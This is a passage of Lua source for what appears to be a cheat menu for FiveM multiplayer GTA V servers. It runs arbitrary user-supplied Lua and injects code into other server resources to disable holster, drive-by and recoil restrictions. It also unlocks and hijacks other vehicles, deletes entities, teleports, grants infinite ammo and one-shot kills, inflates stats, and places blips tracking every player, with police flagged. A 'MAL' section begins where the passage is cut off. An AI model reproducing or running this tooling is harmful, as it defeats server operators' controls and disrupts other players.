                "Asterope",
                "Emperor",
                "Fugitive",
                "Ingot",
                "Intruder",
                "Rentalbus",
                "Trash",
                "Alpha",
                "Banshee",
                "Buffalo",
                "Comet2",
                "Coquette",
                "Feltzer2",
                "Fusilade",
                "Futo",
                "Jester",
                "Massacro",
                "Ninef",
                "Penumbra",
                "Tornado",
                "Boxville",
                "Burrito",
                "Minivan",
                "Pony",
                "Taco",
                "Speedo",
                "Stanier",
                "Regina",
            }

        elseif code == "-nowarnings" then

            wmlua.I.AcknowledgedWarnings = true
            wmlua.F.EventLogInsert('[~b~WM~w~] No warnings')

        elseif code == "_g" then

            wmlua.F.DumpTable(_G, false)
            wmlua.F.EventLogInsert('[~b~WM~w~] Dumped Global ENV')

        else

            wmlua_Thread(function()

                wmlua_load(code)()

            end)

        end

    end

    function wmlua.F.LUATest()

    end

    function wmlua.F.MISForceMotion()
        wmlua.V.motion = tonumber(wmlua.F.GetInput("motion?"))
    end

    function wmlua.F.MISOpkAI()

        wmlua.F.CFS("wmlua.V.Mis_opkai")

    end

    function wmlua.F.MISNoAICollisions()

        wmlua.F.CFS("wmlua.V.Mis_noaicollisions")

    end

    function wmlua.F.MISApplyNoCollision()

        local objList = wmlua.N.GetEntList("CObject")
        for i = 1, #objList do
            wmlua.N.SetEntityCollision(objList[i], false, true)
        end

        wmlua.F.EventLogInsert('[~b~WM~w~] Applied no collision')

    end

    function wmlua.F.MISApplyCollision()

        local objList = wmlua.N.GetEntList("CObject")
        for i = 1, #objList do
            wmlua.N.SetEntityCollision(objList[i], true, true)
        end

        wmlua.F.EventLogInsert('[~b~WM~w~] Applied collisions')

    end

    function wmlua.F.MISNoCombatStance()

        wmlua.F.CFS("wmlua.V.Mis_nocombatstance")

    end

    function wmlua.F.MISInfiniteRoll()

        wmlua.F.CFS("wmlua.V.Mis_infiniteroll")

        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Mis_infiniteroll"]].active then
            wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_STRENGTH"), 1100, true)
            wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_WHEELIE_ABILITY"), 1100, true)
            wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_DRIVING_ABILITY"), 1100, true)
            wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_FLYING_ABILITY"), 1100, true)
            wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_SHOOTING_ABILITY"), 1100, true)
            wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_STEALTH_ABILITY"), 1100, true)
        else
            wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_STRENGTH"), 100, true)
            wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_WHEELIE_ABILITY"), 100, true)
            wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_DRIVING_ABILITY"), 100, true)
            wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_FLYING_ABILITY"), 100, true)
            wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_SHOOTING_ABILITY"), 100, true)
            wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_STEALTH_ABILITY"), 100, true)
        end

    end

    function wmlua.F.MISFixInterior()
        RefreshInterior(GetInteriorAtCoords(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed())))
    end

    function wmlua.F.MISTeleportToCoordinates()

        wmlua.V.TPCoords = wmlua.F.GetInput("Enter Coordinates (x,y,z) Seperators = , & ,space & space")
        wmlua.V.tpargs = {}
        wmlua.V.validInput = true
        if string.match(wmlua.V.TPCoords, ", ") then
            wmlua.V.tpargs = wmlua.F.Split(wmlua.V.TPCoords, ", ")
        elseif string.match(wmlua.V.TPCoords, ",") then
            wmlua.V.tpargs = wmlua.F.Split(wmlua.V.TPCoords, ",")
        elseif string.match(wmlua.V.TPCoords, wmlua.STRINGS[20]) then
            wmlua.V.tpargs = wmlua.F.Split(wmlua.V.TPCoords, wmlua.STRINGS[20])
        elseif type(wmlua.V.tpargs[1]) == wmlua.STRINGS[53] and type(wmlua.V.tpargs[2]) == wmlua.STRINGS[53] and type(wmlua.V.tpargs[3]) == wmlua.STRINGS[53] then
        else
            wmlua.V.validInput = false
        end

        if wmlua.V.validInput then
            for k,v in ipairs(wmlua.V.tpargs) do
                wmlua.V.tpargs[k] = tonumber(v)
                if type(wmlua.V.tpargs[k]) == wmlua.STRINGS[53] then
                    wmlua.V.tpargs[k] = wmlua.V.tpargs[k] + 0.0001 -- Don't remember if coords require being a float so, we'll make it be anyways
                else
                    wmlua.V.validInput = false
                end
            end
        end

        if wmlua.V.validInput then

            wmlua.F.TeleportToCoords(wmlua.V.tpargs[1], wmlua.V.tpargs[2], wmlua.V.tpargs[3])

        else

            if type(wmlua.V.tpargs[1]) ~= wmlua.STRINGS[53] then wmlua.V.tpargs[1] = wmlua.STRINGS[9] end
            if type(wmlua.V.tpargs[2]) ~= wmlua.STRINGS[53] then wmlua.V.tpargs[2] = wmlua.STRINGS[9] end
            if type(wmlua.V.tpargs[3]) ~= wmlua.STRINGS[53] then wmlua.V.tpargs[3] = wmlua.STRINGS[9] end
            wmlua_print('\nX = ' .. wmlua.V.tpargs[1] .. ' | Y = ' .. wmlua.V.tpargs[2] .. ' | Z = ' .. wmlua.V.tpargs[3])
            wmlua_print('\nInvalid Coordinates')

        end

    end

    function wmlua.F.MISTeleportToWaypoint()
        local entity = wmlua.N.GetPlayerPed()
        if wmlua.N.IsPedInAVehicle(entity, false) then
            entity = wmlua.N.GetVehiclePedIsUsing(entity)
        end
        local wph = wmlua.N.GetFirstBlipInfoId(8)
        if wmlua.N.DoesBlipExist(wph) then
            local wpc = wmlua.N.GetBlipInfoIdCoord(wph)
            for height = -50, 800, 0.05 do
                wmlua.N.SetEntityPos(entity, wpc.x, wpc.y, height + 0.0, 0.0, 0.0, 0.0, false)
                wmlua.N.RequestCollisionAtCoord(wpc.x, wpc.y, height + 0.0)
                local foundGround, zPos = GetGroundZFor_3dCoord(wpc.x, wpc.y, height + 0.0)
                if foundGround then
                    wmlua.N.SetEntityPos(entity, wpc.x, wpc.y, height + 0.0, 0.0, 0.0, 0.0, false)
                    break
                end
            end
        end
    end

    function wmlua.F.MISCoordinatesToWaypoint()

        wmlua.V.wpcoords = wmlua.F.GetInput("Enter Coordinates (x,y) Seperators = , & ,space & space")
        wmlua.V.wpargs = {}
        wmlua.V.validInput = true
        if string.match(wmlua.V.wpcoords, ", ") then
            wmlua.V.wpargs = wmlua.F.Split(wmlua.V.wpcoords, ", ")
        elseif string.match(wmlua.V.wpcoords, ",") then
            wmlua.V.wpargs = wmlua.F.Split(wmlua.V.wpcoords, ",")
        elseif string.match(wmlua.V.wpcoords, wmlua.STRINGS[20]) then
            wmlua.V.wpargs = wmlua.F.Split(wmlua.V.wpcoords, wmlua.STRINGS[20])
        elseif type(wmlua.V.wpargs[1]) == wmlua.STRINGS[53] and type(wmlua.V.wpargs[2]) == wmlua.STRINGS[53] then
        else
            wmlua.V.validInput = false
        end

        if wmlua.V.validInput then
            for k,v in ipairs(wmlua.V.wpargs) do
                wmlua.V.wpargs[k] = tonumber(v)
                if type(wmlua.V.wpargs[k]) == wmlua.STRINGS[53] then
                    wmlua.V.wpargs[k] = wmlua.V.wpargs[k] + 0.0001 -- Don't remember if coords require being a float so, we'll make it be anyways
                    wmlua.V.wpargs[k] = wmlua.V.wpargs[k] - 0.0001 -- Don't remember if coords require being a float so, we'll make it be anyways
                else
                    wmlua.V.validInput = false
                end
            end
        end

        if wmlua.V.validInput then

            wmlua.N.SetNewWaypoint(wmlua.V.wpargs[1], wmlua.V.wpargs[2])
            wmlua.F.EventLogInsert("[~b~WM~w~] Waypoint set (" .. wmlua.V.wpargs[1] .. ", " .. wmlua.V.wpargs[2] .. ")", 2000)

        else

            if type(wmlua.V.wpargs[1]) ~= wmlua.STRINGS[53] then wmlua.V.wpargs[1] = wmlua.STRINGS[9] end
            if type(wmlua.V.wpargs[2]) ~= wmlua.STRINGS[53] then wmlua.V.wpargs[2] = wmlua.STRINGS[9] end
            wmlua_print('\nX = ' .. wmlua.V.wpargs[1] .. ' | Y = ' .. wmlua.V.wpargs[2])
            wmlua_print('\nInvalid Coordinates')
            wmlua.F.EventLogInsert("[~b~WM~w~] Invalid Coordinates", 2000)

        end

    end

    function wmlua.F.MISNoClip()

        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.CAM_toggle"]].active == false then
            wmlua.F.CFS("wmlua.V.Mis_noclip")

            if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Mis_noclip"]].active then
                wmlua.F.EventLogInsert("[~b~WM~w~] Noclip enabled", 2000)
            else
                wmlua.F.EventLogInsert("[~b~WM~w~] Noclip disabled", 2000)
            end
        end

    end

    function wmlua.F.MISSolo()

        wmlua.N.NetworkSessionLeaveSinglePlayer()

    end

    function wmlua.F.VEHUnlock()

        local coordA = wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(), 1)
        local coordB = wmlua.N.GetOffsetFromEntityInWorldCoords(wmlua.N.GetPlayerPed(), 0.0, 20.0, -0.5)
        local targetVehicle = wmlua.F.GetVehicleRaycast(coordA, coordB)
        wmlua.F.RequestControl(targetVehicle)
        wmlua.N.DecorSetBool(targetVehicle, 'VehicleLocked', false)
        wmlua.N.SetVehicleDoorsLocked(targetVehicle, 1)
        wmlua.N.SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

    end

    function wmlua.F.VEHTpInfront()

        wmlua_Thread(function()
            local ogVehicle = wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed())
            local camDir = wmlua.F.GetCamDirFromScreenCenter()
            local camPos = wmlua.N.GetGameplayCamCoord()
            local targetPos = camPos + (camDir * 200.0)
            local targetVehicle = wmlua.F.GetVehicleRaycast(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed()), targetPos)
            local taken = false
            for i = 1, 50 do
                if not taken and wmlua.V.Active then
                    local tPed = wmlua.N.GetPedInVehicleSeat(targetVehicle, -1)
                    wmlua.N.Clear_PedTasks(tPed, true)
                    wmlua.N.TaskWarpPedIntoVehicle(wmlua.N.GetPlayerPed(), targetVehicle, -1)
                    wmlua.F.RequestControl(tPed)
                    if not wmlua.N.IsPedAPlayer(tPed) then
                        wmlua.N.DeleteEntity(tPed)
                    end
                    if wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), true) == targetVehicle then
                        taken = true
                    end
                    wmlua_Schleep(10)
                else
                    break
                end
            end
            local tPed_Model = wmlua.N.GetEntityModel(tPed)
            local crazyPed = wmlua.N.CreatePedInsideVehicle(ogVehicle, 4, tPed_Model, -1, true, true)
            wmlua.N.TaskVehicleDriveWander(crazyPed, ogVehicle, 800.0, 787004)
            wmlua.F.RequestControl(targetVehicle)
            wmlua.N.DecorSetBool(targetVehicle, 'VehicleLocked', false)
            wmlua.N.SetVehicleDoorsLocked(targetVehicle, 1)
            wmlua.N.SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
        end)

    end

    function wmlua.F.VEHDelInfront()

        wmlua_Thread(function()
            local coordA = wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(), 1)
            local coordB = wmlua.N.GetOffsetFromEntityInWorldCoords(wmlua.N.GetPlayerPed(), 0.0, 20.0, -0.5)
            local targetVehicle = wmlua.F.GetVehicleRaycast(coordA, coordB)
            wmlua.F.RequestControl(targetVehicle)
            wmlua.N.SetEntityAsMissionEntity(targetVehicle,true,true)
            wmlua.N.DeleteEntity(targetVehicle)
        end)

    end

    function wmlua.F.WEPRapidfire()

        wmlua.F.CFS("wmlua.V.Wep_rapidfire")

    end

    function wmlua.F.WEPInfAmmo()

        wmlua.F.CFS("wmlua.V.Wep_infammo")

    end

    function wmlua.F.WEPOneShot()

        wmlua.F.CFS("wmlua.V.Wep_oneshot")

    end

    function wmlua.F.WEPNoReload()

        wmlua.F.CFS("wmlua.V.Wep_noreload")

    end

    function wmlua.F.WEPAntiScriptedHolster()

        if wmlua.B.wmExecAt then
            local vRes = {
                {res = "esx_guy293_holsterweapon", code = [[
                    function TaskPlayAnim()
                    end
                    function SetPedCurrentWeaponVisible()
                    end
                    function DisablePlayerFiring()
                    end
                    function CheckWeapon()
                        return false
                    end
                ]]},
                {res = "esx_holster", code = [[
                    function TaskPlayAnim()
                    end
                    function SetPedCurrentWeaponVisible()
                    end
                    function DisablePlayerFiring()
                    end
                    function CheckWeapon()
                        return false
                    end
                ]]},
                {res = "esx_holsterweapon", code = [[
                    function TaskPlayAnim()
                    end
                    function SetPedCurrentWeaponVisible()
                    end
                    function DisablePlayerFiring()
                    end
                    function CheckWeapon()
                        return false
                    end
                ]]},
                {res = "guy293_holsterweapon", code = [[
                    function TaskPlayAnim()
                    end
                    function SetPedCurrentWeaponVisible()
                    end
                    function DisablePlayerFiring()
                    end
                    function CheckWeapon()
                        return false
                    end
                ]]},
            }
            for i = 1, #vRes do
                if wmlua.T.ResourceDI[vRes[i].res] then
                    wmlua.B.wmExecAt(vRes[i].res, vRes[i].code)
                    wmlua.F.EventLogInsert("[~g~WM~w~] Compatible script found, should be disabled.")
                    return
                else
                end
            end
            wmlua.F.EventLogInsert("[~r~WM~w~] Compatible script not found")
        end
        
    end

    function wmlua.F.WEPAllowDriveBy()

        if wmlua.B.wmExecAt then
            local vRes = {
                {res = "NoDriveBy", code = [[
                    local c = SetPlayerCanDoDriveBy
                    function SetPlayerCanDoDriveBy()
                    end
                    c(PlayerId(), true)
                ]]},
            }
            for i = 1, #vRes do
                if wmlua.T.ResourceDI[vRes[i].res] then
                    wmlua.B.wmExecAt(vRes[i].res, vRes[i].code)
                    wmlua.F.EventLogInsert("[~g~WM~w~] Compatible script found, should be disabled.")
                else
                    wmlua.F.EventLogInsert("[~r~WM~w~] Compatible script not found")
                end
            end
        end
        
    end

    function wmlua.F.WEPAntiScriptedRecoil()

        if wmlua.B.wmExecAt then
            wmlua.B.wmExecAt('weaponry', [[
                function ClampGameplayCamPitch(...)
                end
                function SetGameplayCamRawPitch(...)
                end
                function IsPedShooting(...)
                end
                function ShakeGameplayCam(...)
                end
                function SetGameplayCamRelativePitch(...)
                end
                ]])
        end
        
    end

    wmlua.V.powerval = 1

    function wmlua.F.VEHPower()

        wmlua.V.powerval = wmlua.F.GetInput("Enter Power Multiplier")
        wmlua.V.powerval = tonumber(wmlua.V.powerval)

        if type(wmlua.V.powerval) == wmlua.STRINGS[53] then
            wmlua.F.CFT("wmlua.V.Veh_setpower", "Modify Power " .. math.abs(math.floor(wmlua.V.powerval)))
            wmlua.V.powerval = wmlua.V.powerval + 0.01
            wmlua.H.WMInvokeNative(wmlua.STRINGS[61], wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed()), wmlua.V.powerval)
        else
            wmlua.F.EventLogInsert("[~b~WM~w~] Invalid Input", 2000)
        end

    end

    function wmlua.F.VEHUnflip()

        local _veh = wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), true)
        if _veh == 0 or _veh == nil then
            local coordA = wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(), 1)
            local coordB = wmlua.N.GetOffsetFromEntityInWorldCoords(wmlua.N.GetPlayerPed(), 0.0, 20.0, -0.5)
            _veh = wmlua.F.GetVehicleRaycast(coordA, coordB)
        end

        wmlua.F.RequestControl(_veh)

        wmlua.N.SetVehicleOnGroundProperly(_veh)

    end

    function wmlua.F.VEHDrift()

        local vehicle = wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed())
        wmlua.V.powerval = 1400.0

        if vehicle == 0 or vehicle == nil then
        else

            wmlua.H.WMInvokeNative(wmlua.STRINGS[61], wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed()), tonumber(wmlua.V.powerval))
            wmlua.N.SetVehicleHandlingField(vehicle,"CHandlingData","fSteeringLock",62.5)
            wmlua.N.SetVehicleHandlingField(vehicle,"CHandlingData","fDriveInertia",2.0)
            wmlua.N.SetVehicleHandlingField(vehicle,"CHandlingData","fTractionCurveLateral",40.0)
            wmlua.N.SetVehicleHandlingField(vehicle,"CHandlingData","fTractionCurveMin",1.8)
            wmlua.N.SetVehicleHandlingField(vehicle,"CHandlingData","fTractionCurveMax",1.8)
            wmlua.N.SetVehicleHandlingField(vehicle,"CHandlingData","fCamberStiffness",1.0)
            wmlua.N.SetVehicleHandlingField(vehicle,"CHandlingData","fTractionBiasFront",0.51)
            wmlua.N.SetVehicleHandlingField(vehicle,"CHandlingData","fLowSpeedTractionLossMult",0.7)
            wmlua.F.CFT("wmlua.V.Veh_setpower", "Modify Power " .. math.abs(math.floor(wmlua.V.powerval)))
            wmlua.F.EventLogInsert("[~b~WM~w~] Applied drift handling", 2000)

        end

    end

    wmlua.V.Veh_speedboost_intensity = 0.1

    function wmlua.F.VEHSpeedBoost()

        if not wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Veh_speedboost"]].active then
            wmlua.V.Veh_speedboost_intensity = tonumber(wmlua.F.GetInput("Enter Speed Boost Intensity (rec: 0.1-0.5)"))
        end

        wmlua.F.CFS("wmlua.V.Veh_speedboost")

    end

    wmlua.V.Veh_superbrake_intensity = 0.1

    function wmlua.F.VEHSuperBrake()

        if not wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Veh_superbrake"]].active then
            wmlua.V.Veh_superbrake_intensity = tonumber(wmlua.F.GetInput("Enter Speed Boost Intensity (rec: 0.1-0.5)"))
        end

        wmlua.F.CFS("wmlua.V.Veh_superbrake")

    end

    function wmlua.F.VEHShitDrift()

        wmlua.F.CFS("wmlua.V.Veh_shitdriftmode")

    end

    function wmlua.F.VEHScorch()

        wmlua.F.CFS("wmlua.V.Veh_scorch")

    end

    function wmlua.F.VEHSpitfire()

        wmlua.F.CFS("wmlua.V.Veh_spitfire")

    end

    function wmlua.F.VEHSetHandling()

        local vehicle = wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed())
        local class = "CHandlingData"
        local fieldname = wmlua.F.GetInput("Enter Handling Field")
        local fieldvalue = wmlua.F.GetInput("Enter Handling Field Value")
        wmlua.H.WMInvokeNative(wmlua.STRINGS[62], vehicle,class,fieldname,tonumber(fieldvalue))
        wmlua.N.SetVehicleHandlingField(vehicle,class,fieldname,tonumber(fieldvalue))

    end

    function wmlua.F.VEHLMS()

        wmlua.F.LSCRefresh()
        wmlua.F.TabChange(wmlua.STRINGS[54])

    end

    function wmlua.F.LSC_GetModLevelName(modType)

        wmlua.V.maxModsOfType = math.abs(wmlua.N.GetNumVehicleMods(wmlua.V.playerVehicle, modType))
        wmlua.V.curMod = wmlua.N.GetVehicleMod(wmlua.V.playerVehicle, modType) + 1

        if wmlua.N.GetVehicleMod(wmlua.V.playerVehicle, modType) == -1 then
            return 0 .. " of " .. wmlua.V.maxModsOfType .. " name Stock"
        else
            curModName = " name " .. wmlua.N.GetLabelText(wmlua.N.GetModTextLabel(wmlua.V.playerVehicle, modType, math.abs(wmlua.N.GetVehicleMod(wmlua.V.playerVehicle, modType))))
            curModName = string.gsub(curModName, "& ", wmlua.STRINGS[19])
            return wmlua.V.curMod .. " of " .. wmlua.V.maxModsOfType .. curModName
        end

    end

    function wmlua.F.LSC_ChangeMod(name, modType, modName)

        wmlua.V.playerVehicle = wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed())
        wmlua.N.SetVehicleModKit(wmlua.V.playerVehicle, 0)

        if modName ~= "Turbo" then

            wmlua.V.curMod = wmlua.N.GetVehicleMod(wmlua.V.playerVehicle, modType)
            wmlua.V.maxModsOfType = math.abs(wmlua.N.GetNumVehicleMods(wmlua.V.playerVehicle, modType))

            local mc = -1
            for j = -2, wmlua.V.maxModsOfType + 1, 1 do
                mc = mc + 1
            end

            if wmlua.V.curMod + 1 > mc == false then
                wmlua.N.SetVehicleMod(wmlua.V.playerVehicle, modType, wmlua.V.curMod + 1, false)
            else
                wmlua.N.SetVehicleMod(wmlua.V.playerVehicle, modType, 0, false)
            end

            if wmlua.N.GetVehicleMod(wmlua.V.playerVehicle, modType) == -1 then
                curModName = " name Stock"
            else
                curModName = " name " .. wmlua.N.GetLabelText(wmlua.N.GetModTextLabel(wmlua.V.playerVehicle, modType, math.abs(wmlua.N.GetVehicleMod(wmlua.V.playerVehicle, modType))))
            end

            wmlua.V.curMod = wmlua.N.GetVehicleMod(wmlua.V.playerVehicle, modType) + 1

            curModName = string.gsub(curModName, "& ", wmlua.STRINGS[19])

            wmlua.F.CFT(name, modName .. wmlua.STRINGS[20] .. wmlua.V.curMod .. " of " .. wmlua.V.maxModsOfType .. curModName)

        else

            if not wmlua.N.IsToggleModOn(wmlua.V.playerVehicle, modType) then
                wmlua.N.ToggleVehicleMod(wmlua.V.playerVehicle, modType, true)
                wmlua.F.CFT(name, modName .. " ~g~On")
            else
                wmlua.N.ToggleVehicleMod(wmlua.V.playerVehicle, modType, false)
                wmlua.F.CFT(name, modName .. " ~r~Off")
            end

        end

        wmlua.F.VEHFix()

    end

    function wmlua.F.LSCRefresh()

        wmlua.V.playerVehicle = wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed())
        wmlua.N.SetVehicleModKit(wmlua.V.playerVehicle, 0)

        wmlua.F.CFT("wmlua.V.LSC_changeengine", "Engine " .. wmlua.F.LSC_GetModLevelName(11))
        wmlua.F.CFT("wmlua.V.LSC_changebrakes", "Brakes " .. wmlua.F.LSC_GetModLevelName(12))
        wmlua.F.CFT("wmlua.V.LSC_changetransmission", "Transmission " .. wmlua.F.LSC_GetModLevelName(13))
        wmlua.F.CFT("wmlua.V.LSC_changesuspension", "Suspension " .. wmlua.F.LSC_GetModLevelName(15))
        wmlua.F.CFT("wmlua.V.LSC_changearmor", "Armor " .. wmlua.F.LSC_GetModLevelName(16))

        if wmlua.N.IsToggleModOn(wmlua.V.playerVehicle, 18) then
            wmlua.F.CFT("wmlua.V.LSC_changeturbo", "Turbo ~g~On")
        else
            wmlua.F.CFT("wmlua.V.LSC_changeturbo", "Turbo ~r~Off")
        end

        wmlua.F.CFT("wmlua.V.LSC_changefrontbumper", "Front Bumper " .. wmlua.F.LSC_GetModLevelName(1))
        wmlua.F.CFT("wmlua.V.LSC_changerearbumper", "Rear Bumper " .. wmlua.F.LSC_GetModLevelName(2))
        wmlua.F.CFT("wmlua.V.LSC_changesideskirt", "Side Skirt " .. wmlua.F.LSC_GetModLevelName(3))
        wmlua.F.CFT("wmlua.V.LSC_changespoiler", "Spoiler " .. wmlua.F.LSC_GetModLevelName(0))

    end

    function wmlua.F.LSCEngine()

        wmlua.F.LSC_ChangeMod("wmlua.V.LSC_changeengine", 11, "Engine")

    end

    function wmlua.F.LSCBrakes()

        wmlua.F.LSC_ChangeMod("wmlua.V.LSC_changebrakes", 12, "Brakes")

    end

    function wmlua.F.LSCTransmission()

        wmlua.F.LSC_ChangeMod("wmlua.V.LSC_changetransmission", 13, "Transmission")

    end

    function wmlua.F.LSCSuspension()

        wmlua.F.LSC_ChangeMod("wmlua.V.LSC_changesuspension", 15, "Suspension")

    end

    function wmlua.F.LSCArmor()

        wmlua.F.LSC_ChangeMod("wmlua.V.LSC_changearmor", 16, "Armor")

    end

    function wmlua.F.LSCTurbo()

        wmlua.F.LSC_ChangeMod("wmlua.V.LSC_changeturbo", 18, "Turbo")

    end

    function wmlua.F.LSCFrontBumper()

        wmlua.F.LSC_ChangeMod("wmlua.V.LSC_changefrontbumper", 1, "Front Bumper")

    end

    function wmlua.F.LSCRearBumper()

        wmlua.F.LSC_ChangeMod("wmlua.V.LSC_changerearbumper", 2, "Rear Bumper")

    end

    function wmlua.F.LSCSideSkirt()

        wmlua.F.LSC_ChangeMod("wmlua.V.LSC_changesideskirt", 3, "Side Skirt")

    end

    function wmlua.F.LSCSpoiler()

        wmlua.F.LSC_ChangeMod("wmlua.V.LSC_changespoiler", 0, "Spoiler")

    end

    wmlua.V.Cop_blip = 0

    function wmlua.F.WMBlips()

        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_playerblips"]].active then

            for _, v in ipairs(wmlua.T.apblips) do
                wmlua.N.RemoveBlip(v)
            end

            for _, player in ipairs(wmlua.N.GetActivePlayers()) do

                wmlua.V.pb_ped = wmlua.N.GetPlayerPed(player)
                if wmlua.V.pb_ped ~= wmlua.N.GetPlayerPed() then

                    wmlua.V.pb = wmlua.N.AddBlipForEntity(wmlua.V.pb_ped)

                    wmlua.F.InsertToTable(wmlua.T.apblips, wmlua.V.pb)

                    if wmlua.N.IsPedInAVehicle(wmlua.V.pb_ped) then

                        wmlua.V.pb_ped_veh = wmlua.N.GetVehicleClass(wmlua.N.GetVehiclePedIsIn(wmlua.V.pb_ped, false))
                        wmlua.V.ppedvehcount = 0

                        for i = -1, 6 do

                            if wmlua.N.DoesEntityExist(wmlua.N.GetPedInVehicleSeat(wmlua.N.GetVehiclePedIsIn(wmlua.V.pb_ped, false), i)) then
                                wmlua.V.ppedvehcount = wmlua.V.ppedvehcount + 1
                            end

                        end

                        wmlua.H.WMInvokeNative(wmlua.STRINGS[30], wmlua.V.pb, tonumber(wmlua.V.ppedvehcount))
                        wmlua.H.WMInvokeNative(wmlua.STRINGS[63], wmlua.V.pb, 0)

                        for i = 0, 7 do
                            if wmlua.N.GetVehicleClass(wmlua.V.pb_ped_veh) == i then
                                wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 1) -- normal cars
                            end
                        end

                        if wmlua.N.GetVehicleClass(wmlua.V.pb_ped_veh) == 8 or wmlua.N.GetVehicleClass(wmlua.V.pb_ped_veh) == 13 then
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 226) -- motorcycles
                        end

                        if wmlua.N.GetVehicleClass(wmlua.V.pb_ped_veh) == 9 then
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 147) -- offroaders
                        end

                        if wmlua.N.GetVehicleClass(wmlua.V.pb_ped_veh) == 10 or wmlua.N.GetVehicleClass(wmlua.V.pb_ped_veh) == 11 then
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 477) -- trucks
                        end

                        if wmlua.N.GetVehicleClass(wmlua.V.pb_ped_veh) == 12 then
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 85)
                        end

                        if wmlua.N.GetVehicleClass(wmlua.V.pb_ped_veh) == 14 then
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 427) -- Boats
                        end

                        if wmlua.N.GetVehicleClass(wmlua.V.pb_ped_veh) == 15 then
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 64) -- heli
                        end

                        if wmlua.N.GetVehicleClass(wmlua.V.pb_ped_veh) == 16 then
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 423) -- Plane
                        end

                        if wmlua.N.GetVehicleClass(wmlua.V.pb_ped_veh) == 17 or wmlua.N.GetVehicleClass(wmlua.V.pb_ped_veh) == 20 then
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 513) -- Service
                        end

                        if IsPedInAnyPoliceVehicle(wmlua.V.pb_ped) then
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 56) -- Police
                            if wmlua.V.Cop_blip == 0 then
                                wmlua.H.WMInvokeNative(wmlua.STRINGS[63], wmlua.V.pb, 1)
                            else
                                wmlua.H.WMInvokeNative(wmlua.STRINGS[63], wmlua.V.pb, 3)
                            end
                        elseif wmlua.N.GetVehicleClass(wmlua.V.pb_ped_veh) == 18 then
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 67) -- EMS
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[63], wmlua.V.pb, 2)
                        end

                        if wmlua.N.GetVehicleClass(wmlua.V.pb_ped_veh) == 19 then
                            if IsPedInAnyPlane then
                                wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 424) -- Military Jet
                            else
                                wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 421) -- Military (Tank)
                            end
                        end

                    else

                        wmlua.H.WMInvokeNative(wmlua.STRINGS[30], wmlua.V.pb, 0)
                        if wmlua.N.GetEntityHealth(wmlua.V.pb_ped) > 0 then
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[65], wmlua.V.pb, true)
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 1) -- Peeper
                        else
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[64], wmlua.V.pb, 274) -- DEAD boi
                            wmlua.H.WMInvokeNative(wmlua.STRINGS[65], wmlua.V.pb, false)
                        end

                    end

                    wmlua.H.WMInvokeNative(wmlua.STRINGS[66], wmlua.V.pb, 0.9)
                    wmlua.H.WMInvokeNative(wmlua.STRINGS[67], wmlua.V.pb, true)
                    wmlua.H.WMInvokeNative(wmlua.STRINGS[68], wmlua.V.pb, player)

                end

            end

        elseif not wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_safeplayerblips"]].active then

            for _, v in ipairs(wmlua.T.apblips) do
                wmlua.N.RemoveBlip(v)
            end

        end

    end

    function wmlua.F.VISDrawCoords()

        wmlua.F.CFS("wmlua.V.Vis_drawcoords")

    end

    function wmlua.F.SIDToPID(SID)

        for i, v in ipairs(wmlua.Playerlist_Players) do

            if tonumber(v.pid) == tonumber(SID) then
                return tonumber(v.player)
            end

        end

        return -69

    end
    
    function wmlua.F.MALObjCars(p1)

        wmlua_Thread(function()

            if p1 == "Big Block" then
                local cars = wmlua.N.GetEntList("CVehicle")
